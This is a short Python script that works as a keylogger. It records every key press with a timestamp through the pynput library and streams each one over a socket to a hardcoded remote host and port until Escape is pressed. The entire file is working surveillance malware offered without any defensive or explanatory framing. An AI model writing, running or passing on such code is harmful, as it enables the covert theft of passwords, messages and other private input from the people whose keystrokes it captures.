import pynput
from pynput.keyboard import Listener, Key
import socket
import datetime

host = '192.168.254.131'
port = 9999

s = socket.socket()
s.connect((host, port))

def press(key):
    l = f"{datetime.datetime.now()} : {key}"
    s.send(str(l).encode())

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()
